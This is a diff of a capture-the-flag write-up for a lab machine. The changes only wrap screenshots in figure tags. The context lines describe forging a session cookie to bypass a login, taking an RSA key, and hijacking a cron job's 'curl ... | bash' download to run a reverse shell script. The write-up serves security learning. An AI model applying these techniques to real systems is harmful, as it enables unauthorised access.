@@ -33,7 +33,9 @@ As we can see there are two open ports:
 
 Let's visit the machine using our browser.
 
+<figure style={{ textAlign: 'center' }}>
 ![2](https://github.com/Knign/Write-ups/assets/110326359/acf8f872-59a3-4055-af28-cefa0b73656d)
+</figure>
 
 There is nothing of use here.
 
@@ -67,15 +69,21 @@ Finished
 ```
 Let's go to the `/admin` page.
 
+<figure style={{ textAlign: 'center' }}>
 ![3](https://github.com/Knign/Write-ups/assets/110326359/5527c743-20b7-4eed-a27f-3363dd8e9764)
+</figure>
 
 We can view the source code using `CTRL+U`.
 
+<figure style={{ textAlign: 'center' }}>
 ![4](https://github.com/Knign/Write-ups/assets/110326359/c49f54a4-1b07-4eeb-b2a5-8f8a8c95a079)
+</figure>
 
 Let's view the `/login.js` file.
 
+<figure style={{ textAlign: 'center' }}>
 ![5](https://github.com/Knign/Write-ups/assets/110326359/007e22b5-853d-4935-82f1-39bf73994f58)
+</figure>
 
 In this code, the `login()` function is what is important.
 ```js title="login.js"
@@ -103,15 +111,21 @@ If it doesn't, then the session cookie is set to the received value and we are r
 This is the bug we are going to exploit.
 Let's go to the `Developer Tools > Storage` tab.
 
+<figure style={{ textAlign: 'center' }}>
 ![6](https://github.com/Knign/Write-ups/assets/110326359/af7d5aef-3d81-4ac7-afc1-c435ddbd94f9)
+</figure>
 
 We can create a new cookie using the `+` sign in the right hand corner.
 
+<figure style={{ textAlign: 'center' }}>
 ![7](https://github.com/Knign/Write-ups/assets/110326359/aede1cc5-3f5b-4b87-8503-353f110929b2)
+</figure>
 
 Let's refresh the page.
 
+<figure style={{ textAlign: 'center' }}>
 ![8](https://github.com/Knign/Write-ups/assets/110326359/bb9d1970-a4ab-4f4b-9d1f-83935db26837)
+</figure>
 
 We get an encrypted key. Let's save the key to a file called `rsa_key`.
 ```
@@ -251,7 +265,9 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 ```
 We have to change the IP address that is mapped to `overpass.thm` to our IP address so that when the `curl overpass.thm/downloads/src/buildscript.sh | bash` command is run, it will run the file hosted by us. 
 
+<figure style={{ textAlign: 'center' }}>
 ![9](https://github.com/Knign/Write-ups/assets/110326359/a43b4126-4243-42e2-89db-fb5ebe2c7b5b)
+</figure>
 
 - Now we have to create the necessary directories inside `/var/www/html/`.
 ```
@@ -262,7 +278,9 @@ $ cd src
 ```
 Now let's create a `buildscript.sh` file and include reverse shell code in it.
 
+<figure style={{ textAlign: 'center' }}>
 ![10](https://github.com/Knign/Write-ups/assets/110326359/25f258b3-8084-440e-bc7e-b404afd4dce7)
+</figure>
 
 Let's restart `apache2`.
 ```
